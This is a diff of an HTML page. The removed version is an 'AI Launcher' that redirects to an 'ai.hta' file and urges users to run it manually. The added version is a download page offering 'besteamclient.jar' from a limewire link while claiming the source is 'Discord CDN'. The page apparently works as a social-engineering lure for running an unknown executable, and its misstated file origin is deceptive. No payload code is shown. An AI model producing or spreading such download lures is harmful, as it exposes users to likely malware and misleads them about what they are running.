@@ -1,30 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>AI Launcher</title>
-</head>
-
-<body style="background:black; color:lime; font-family:consolas; text-align:center; padding-top:100px;">
-
-  <h1>AI System</h1>
-  <p>Click below to start AI</p>
-
-  <button onclick="startAI()" style="padding:12px 25px; font-size:16px; cursor:pointer;">
-    Start AI
-  </button>
-
-  <p id="info" style="margin-top:20px; color:gray;"></p>
-
-  <script>
-    function startAI() {
-      // Try to open HTA
-      window.location.href = "ai.hta";
-
-      // Show message if blocked
-      document.getElementById("info").innerText =
-        "If nothing happens, download the file and run it manually.";
+<meta charset="UTF-8">
+<title>Download Page</title>
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: black;
+        color: white;
+        overflow: hidden;
     }
-  </script>
+
+    .star {
+        position: absolute;
+        width: 2px;
+        height: 2px;
+        background: white;
+        animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+        from { transform: translateY(-10px); opacity: 1; }
+        to { transform: translateY(100vh); opacity: 0; }
+    }
+
+    .container {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        text-align: center;
+        z-index: 2;
+    }
+
+    .btn {
+        margin-top: 20px;
+        padding: 12px 25px;
+        background: white;
+        color: black;
+        border-radius: 8px;
+        text-decoration: none;
+        display: inline-block;
+    }
+
+    .btn:hover {
+        background: #ccc;
+    }
+
+    .info {
+        margin-top: 15px;
+        color: #aaa;
+        font-size: 14px;
+    }
+
+    a.link {
+        color: #4da6ff;
+        word-break: break-all;
+        display: block;
+        margin-top: 10px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Download File</h1>
+    <p>Please review the file before downloading.</p>
+
+    <a class="btn" href="https://limewire.com/d/MMr65#2VVoOUHgkA" download>
+        Download
+    </a>
+
+    <div class="info">
+        File: besteamclient.jar<br>
+        Source: Discord CDN
+    </div>
+
+    <a class="link" href="https://limewire.com/d/MMr65#2VVoOUHgkA">
+        View direct link
+    </a>
+</div>
+
+<script>
+    for (let i = 0; i < 100; i++) {
+        let star = document.createElement("div");
+        star.className = "star";
+        star.style.left = Math.random() * 100 + "vw";
+        star.style.animationDuration = (Math.random() * 3 + 2) + "s";
+        star.style.opacity = Math.random();
+        document.body.appendChild(star);
+    }
+</script>
 
 </body>
 </html>
